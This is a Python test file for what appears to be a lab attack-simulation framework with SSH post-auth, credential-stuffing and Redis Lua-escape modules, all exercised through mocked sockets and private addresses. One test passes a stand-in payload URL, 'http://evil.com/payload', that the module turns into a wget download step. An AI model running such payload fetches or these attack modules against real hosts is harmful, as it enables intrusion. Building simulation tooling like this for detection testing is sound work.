"""Tests for attack module registration, profiles, dry_run, and mocked execute."""

from __future__ import annotations

import logging
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from attacks.config import IPSourceConfig, PhaseConfig, TimingConfig, load_campaign
from attacks.modules.base import AttackModuleRegistry
from attacks.modules.credential_stuffing import CredentialStuffingModule
from attacks.modules.redis_lua_escape import (
    COMMAND_PROFILES as REDIS_COMMAND_PROFILES,
    RedisLuaEscapeModule,
    _resp_encode,
)
from attacks.modules.ssh_post_auth import COMMAND_PROFILES, SSHPostAuthModule

CAMPAIGNS_DIR = Path(__file__).parent.parent.parent / "campaigns"


# ── Registration ──────────────────────────────────────────────────────


class TestModuleRegistration:
    def test_all_six_modules_registered(self):
        available = AttackModuleRegistry.available()
        assert "recon" in available
        assert "ssh_brute_force" in available
        assert "log4shell" in available
        assert "ssh_post_auth" in available
        assert "credential_stuffing" in available
        assert "redis_lua_escape" in available
        assert len(available) == 6

    def test_get_ssh_post_auth(self):
        module = AttackModuleRegistry.get("ssh_post_auth")
        assert isinstance(module, SSHPostAuthModule)
        assert module.name == "ssh_post_auth"

    def test_get_credential_stuffing(self):
        module = AttackModuleRegistry.get("credential_stuffing")
        assert isinstance(module, CredentialStuffingModule)
        assert module.name == "credential_stuffing"

    def test_get_redis_lua_escape(self):
        module = AttackModuleRegistry.get("redis_lua_escape")
        assert isinstance(module, RedisLuaEscapeModule)
        assert module.name == "redis_lua_escape"


# ── Command Profiles ──────────────────────────────────────────────────


class TestCommandProfiles:
    def test_all_profiles_exist(self):
        assert "system_profiler" in COMMAND_PROFILES
        assert "user_enum" in COMMAND_PROFILES
        assert "net_enum" in COMMAND_PROFILES
        assert "full_recon" in COMMAND_PROFILES

    def test_full_recon_contains_all_others(self):
        full = set(COMMAND_PROFILES["full_recon"])
        for name, cmds in COMMAND_PROFILES.items():
            if name != "full_recon":
                for cmd in cmds:
                    assert cmd in full, f"{cmd!r} from {name} not in full_recon"

    def test_profiles_are_non_empty(self):
        for name, cmds in COMMAND_PROFILES.items():
            assert len(cmds) > 0, f"Profile {name!r} is empty"


# ── Dry Run ───────────────────────────────────────────────────────────


def _make_phase(module: str, **param_overrides) -> PhaseConfig:
    """Helper to create a PhaseConfig for testing."""
    params: dict = {}
    if module == "ssh_post_auth":
        params = {"username": "test", "password": "test", "command_profile": "system_profiler"}
    elif module == "credential_stuffing":
        params = {"credentials": [["user1", "pass1"], ["user2", "pass2"]]}
    elif module == "redis_lua_escape":
        params = {"command_profile": "system_info", "inter_command_delay_ms": [0, 0]}
    params.update(param_overrides)

    # Module-specific MITRE mappings
    mitre_map = {
        "ssh_post_auth": ("T1059.004", "TA0002", "execution", "execution", 3),
        "redis_lua_escape": ("T1190", "TA0001", "web_exploit", "initial_access", 3),
    }
    tech, tactic, atype, astage, sev = mitre_map.get(
        module, ("T1110.004", "TA0006", "credential_stuffing", "initial_access", 2)
    )

    return PhaseConfig(
        name="Test Phase",
        module=module,
        mitre_technique=tech,
        mitre_tactic=tactic,
        attack_type=atype,
        attack_stage=astage,
        severity=sev,
        params=params,
        ip_source=IPSourceConfig("aliased", 3, "192.168.2.0/24", start_offset=120),
        timing=TimingConfig(duration_seconds=60),
    )


class TestDryRun:
    def test_post_auth_dry_run(self):
        module = AttackModuleRegistry.get("ssh_post_auth")
        phase = _make_phase("ssh_post_auth")
        ips = ["192.168.2.120", "192.168.2.121"]
        result = module.dry_run(phase, ips)
        assert result["module"] == "ssh_post_auth"
        assert result["ip_count"] == 2
        assert result["params"]["command_profile"] == "system_profiler"

    def test_credential_stuffing_dry_run(self):
        module = AttackModuleRegistry.get("credential_stuffing")
        phase = _make_phase("credential_stuffing")
        ips = ["192.168.2.130", "192.168.2.131"]
        result = module.dry_run(phase, ips)
        assert result["module"] == "credential_stuffing"
        assert result["ip_count"] == 2
        assert len(result["params"]["credentials"]) == 2


# ── Mocked Execute ────────────────────────────────────────────────────


class TestSSHPostAuthExecute:
    @patch("attacks.modules.ssh_post_auth.paramiko.SSHClient")
    @patch("attacks.modules.ssh_post_auth.socket.socket")
    def test_execute_runs_commands(self, mock_socket_cls, mock_ssh_cls):
        """Post-auth module connects, runs commands, returns success."""
        # Mock socket
        mock_sock = MagicMock()
        mock_socket_cls.return_value = mock_sock

        # Mock SSH client — exec_command returns (stdin, stdout, stderr)
        mock_client = MagicMock()
        mock_ssh_cls.return_value = mock_client
        mock_stdout = MagicMock()
        mock_stdout.channel.recv_exit_status.return_value = 0
        mock_client.exec_command.return_value = (MagicMock(), mock_stdout, MagicMock())

        module = AttackModuleRegistry.get("ssh_post_auth")
        phase = _make_phase("ssh_post_auth", inter_command_delay_ms=[0, 0])
        phase.timing = TimingConfig(duration_seconds=300)
        ips = ["192.168.2.120"]

        import random
        rng = random.Random(42)
        logger = logging.getLogger("test")

        result = module.execute("192.168.2.201", phase, ips, rng, logger)

        assert result.module_name == "ssh_post_auth"
        assert result.attempts == 1
        assert result.successes == 1
        assert len(result.metadata["commands_executed"]) == len(COMMAND_PROFILES["system_profiler"])

    @patch("attacks.modules.ssh_post_auth.paramiko.SSHClient")
    @patch("attacks.modules.ssh_post_auth.socket.socket")
    def test_execute_with_download_url(self, mock_socket_cls, mock_ssh_cls):
        """download_url appends wget command to command list."""
        mock_sock = MagicMock()
        mock_socket_cls.return_value = mock_sock

        mock_client = MagicMock()
        mock_ssh_cls.return_value = mock_client
        mock_stdout = MagicMock()
        mock_stdout.channel.recv_exit_status.return_value = 0
        mock_client.exec_command.return_value = (MagicMock(), mock_stdout, MagicMock())

        module = AttackModuleRegistry.get("ssh_post_auth")
        phase = _make_phase(
            "ssh_post_auth",
            command_profile="user_enum",
            download_url="http://evil.com/payload",
            inter_command_delay_ms=[0, 0],
        )
        phase.timing = TimingConfig(duration_seconds=300)
        ips = ["192.168.2.120"]

        import random
        rng = random.Random(42)
        logger = logging.getLogger("test")

        result = module.execute("192.168.2.201", phase, ips, rng, logger)

        expected_count = len(COMMAND_PROFILES["user_enum"]) + 1  # +1 for wget
        assert len(result.metadata["commands_executed"]) == expected_count
        assert result.metadata["download_url"] == "http://evil.com/payload"

    def test_invalid_profile_raises(self):
        """Unknown command_profile raises ValueError."""
        module = AttackModuleRegistry.get("ssh_post_auth")
        phase = _make_phase("ssh_post_auth", command_profile="nonexistent")
        phase.timing = TimingConfig(duration_seconds=60)
        ips = ["192.168.2.120"]

        import random
        rng = random.Random(42)
        logger = logging.getLogger("test")

        with pytest.raises(ValueError, match="Unknown command_profile"):
            module.execute("192.168.2.201", phase, ips, rng, logger)


class TestCredentialStuffingExecute:
    @patch("attacks.modules.credential_stuffing.paramiko.SSHClient")
    @patch("attacks.modules.credential_stuffing.socket.socket")
    def test_execute_tries_each_cred_once(self, mock_socket_cls, mock_ssh_cls):
        """Each credential pair is tried exactly once."""
        mock_sock = MagicMock()
        mock_socket_cls.return_value = mock_sock

        mock_client = MagicMock()
        mock_ssh_cls.return_value = mock_client
        # All logins fail (AuthenticationException)
        mock_client.connect.side_effect = __import__("paramiko").AuthenticationException("denied")

        creds = [[f"user{i}", f"pass{i}"] for i in range(10)]
        module = AttackModuleRegistry.get("credential_stuffing")
        phase = _make_phase("credential_stuffing", credentials=creds)
        phase.timing = TimingConfig(duration_seconds=300)
        ips = ["192.168.2.130"]

        import random
        rng = random.Random(42)
        logger = logging.getLogger("test")

        result = module.execute("192.168.2.201", phase, ips, rng, logger)

        assert result.module_name == "credential_stuffing"
        assert result.attempts == 10
        assert result.successes == 0
        assert result.metadata["unique_usernames"] == 10

    def test_missing_credentials_raises(self):
        """credential_stuffing requires credentials param."""
        module = AttackModuleRegistry.get("credential_stuffing")
        phase = _make_phase("credential_stuffing")
        # Remove credentials from params
        phase.params = {"target_port": 22}
        phase.timing = TimingConfig(duration_seconds=60)
        ips = ["192.168.2.130"]

        import random
        rng = random.Random(42)
        logger = logging.getLogger("test")

        with pytest.raises(ValueError, match="credentials"):
            module.execute("192.168.2.201", phase, ips, rng, logger)


# ── Campaign YAML Loading ─────────────────────────────────────────────


class TestCampaignYAMLLoading:
    def test_load_post_auth_only(self):
        config = load_campaign(CAMPAIGNS_DIR / "post_auth_only.yaml")
        assert len(config.phases) == 1
        assert config.phases[0].module == "ssh_post_auth"
        assert config.phases[0].attack_type == "execution"
        assert config.phases[0].attack_stage == "execution"
        assert config.phases[0].severity == 3

    def test_load_credential_stuffing_only(self):
        config = load_campaign(CAMPAIGNS_DIR / "credential_stuffing_only.yaml")
        assert len(config.phases) == 1
        assert config.phases[0].module == "credential_stuffing"
        assert config.phases[0].attack_type == "credential_stuffing"
        assert config.phases[0].attack_stage == "initial_access"
        assert config.phases[0].severity == 2

    def test_load_full_killchain(self):
        config = load_campaign(CAMPAIGNS_DIR / "full_killchain.yaml")
        assert len(config.phases) == 3
        assert config.phases[0].module == "recon"
        assert config.phases[1].module == "credential_stuffing"
        assert config.phases[2].module == "ssh_post_auth"
        # Verify kill chain progression
        assert config.phases[0].attack_stage == "recon"
        assert config.phases[1].attack_stage == "initial_access"
        assert config.phases[2].attack_stage == "execution"

    def test_load_redis_exploit_only(self):
        config = load_campaign(CAMPAIGNS_DIR / "redis_exploit_only.yaml")
        assert len(config.phases) == 1
        assert config.phases[0].module == "redis_lua_escape"
        assert config.phases[0].attack_type == "web_exploit"
        assert config.phases[0].attack_stage == "initial_access"
        assert config.phases[0].severity == 3

    def test_load_redis_killchain(self):
        config = load_campaign(CAMPAIGNS_DIR / "redis_killchain.yaml")
        assert len(config.phases) == 3
        assert config.phases[0].module == "recon"
        assert config.phases[1].module == "redis_lua_escape"
        assert config.phases[2].module == "ssh_post_auth"
        # Verify kill chain progression
        assert config.phases[0].attack_stage == "recon"
        assert config.phases[1].attack_stage == "initial_access"
        assert config.phases[2].attack_stage == "execution"


# ── Redis RESP Encoding ──────────────────────────────────────────────


class TestRESPEncoding:
    def test_simple_command(self):
        """RESP encode a simple PING command."""
        encoded = _resp_encode("PING")
        assert encoded == b"*1\r\n$4\r\nPING\r\n"

    def test_multi_arg_command(self):
        """RESP encode a multi-argument command."""
        encoded = _resp_encode("SET", "key", "value")
        assert encoded == b"*3\r\n$3\r\nSET\r\n$3\r\nkey\r\n$5\r\nvalue\r\n"

    def test_eval_command(self):
        """RESP encode an EVAL command with Lua script."""
        encoded = _resp_encode("EVAL", "return 1", "0")
        assert encoded == b"*3\r\n$4\r\nEVAL\r\n$8\r\nreturn 1\r\n$1\r\n0\r\n"

    def test_info_command(self):
        """RESP encode INFO command."""
        encoded = _resp_encode("INFO")
        assert encoded == b"*1\r\n$4\r\nINFO\r\n"


# ── Redis Command Profiles ───────────────────────────────────────────


class TestRedisCommandProfiles:
    def test_all_profiles_exist(self):
        expected = {"system_info", "user_enum", "network_enum", "redis_enum", "persistence", "full_recon"}
        assert expected == set(REDIS_COMMAND_PROFILES.keys())

    def test_profiles_are_non_empty(self):
        for name, cmds in REDIS_COMMAND_PROFILES.items():
            assert len(cmds) > 0, f"Redis profile {name!r} is empty"

    def test_full_recon_contains_all_others(self):
        full = set(REDIS_COMMAND_PROFILES["full_recon"])
        for name, cmds in REDIS_COMMAND_PROFILES.items():
            if name != "full_recon":
                for cmd in cmds:
                    assert cmd in full, f"{cmd!r} from {name} not in full_recon"


# ── Redis Dry Run ────────────────────────────────────────────────────


class TestRedisLuaEscapeDryRun:
    def test_dry_run(self):
        module = AttackModuleRegistry.get("redis_lua_escape")
        phase = _make_phase("redis_lua_escape")
        ips = ["192.168.2.170", "192.168.2.171"]
        result = module.dry_run(phase, ips)
        assert result["module"] == "redis_lua_escape"
        assert result["ip_count"] == 2
        assert result["params"]["command_profile"] == "system_info"


# ── Redis Mocked Execute ─────────────────────────────────────────────


class TestRedisLuaEscapeExecute:
    @patch("attacks.modules.redis_lua_escape.socket.socket")
    def test_execute_three_stages(self, mock_socket_cls):
        """Redis module connects, enumerates, exploits, and runs post-exploit commands."""
        mock_sock = MagicMock()
        mock_socket_cls.return_value = mock_sock

        # Build a response sequence:
        # 4 enum commands → INFO, CONFIG GET *, DBSIZE, CLIENT LIST
        # 1 exploit (id) → must contain "uid="
        # N post-exploit commands → generic responses
        responses = []
        # Enum responses (4)
        responses.append(b"+redis_version:6.0.16\r\n")
        responses.append(b"+dir /var/lib/redis\r\n")
        responses.append(b":42\r\n")
        responses.append(b"+id=1 addr=192.168.2.170\r\n")
        # Exploit response (id via EVAL)
        responses.append(b"$28\r\nuid=110(redis) gid=117(redis)\r\n")
        # Post-exploit responses (whoami + system_info profile commands)
        # whoami, uname -a, cat /proc/cpuinfo, cat /proc/meminfo, df -h
        for _ in range(5):
            responses.append(b"$5\r\nredis\r\n")

        mock_sock.recv = MagicMock(side_effect=responses)

        module = AttackModuleRegistry.get("redis_lua_escape")
        phase = _make_phase("redis_lua_escape", inter_command_delay_ms=[0, 0])
        phase.timing = TimingConfig(duration_seconds=300)
        ips = ["192.168.2.170"]

        import random
        rng = random.Random(42)
        logger = logging.getLogger("test")

        result = module.execute("192.168.2.201", phase, ips, rng, logger)

        assert result.module_name == "redis_lua_escape"
        assert result.attempts == 1
        assert result.successes == 1
        assert "enumeration" in result.metadata["stages_completed"]
        assert "exploitation" in result.metadata["stages_completed"]
        assert "post_exploitation" in result.metadata["stages_completed"]
        # id + whoami + 4 system_info commands = 6 (id counted once from exploit stage)
        assert len(result.metadata["commands_executed"]) >= 5

    @patch("attacks.modules.redis_lua_escape.socket.socket")
    def test_execute_connection_failure(self, mock_socket_cls):
        """Connection failure returns zero successes."""
        mock_sock = MagicMock()
        mock_socket_cls.return_value = mock_sock
        mock_sock.connect.side_effect = ConnectionRefusedError("refused")

        module = AttackModuleRegistry.get("redis_lua_escape")
        phase = _make_phase("redis_lua_escape")
        phase.timing = TimingConfig(duration_seconds=300)
        ips = ["192.168.2.170"]

        import random
        rng = random.Random(42)
        logger = logging.getLogger("test")

        result = module.execute("192.168.2.201", phase, ips, rng, logger)

        assert result.attempts == 1
        assert result.successes == 0
        assert len(result.errors) == 1

    def test_invalid_profile_raises(self):
        """Unknown command_profile raises ValueError."""
        module = AttackModuleRegistry.get("redis_lua_escape")
        phase = _make_phase("redis_lua_escape", command_profile="nonexistent")
        phase.timing = TimingConfig(duration_seconds=60)
        ips = ["192.168.2.170"]

        import random
        rng = random.Random(42)
        logger = logging.getLogger("test")

        with pytest.raises(ValueError, match="Unknown command_profile"):
            module.execute("192.168.2.201", phase, ips, rng, logger)
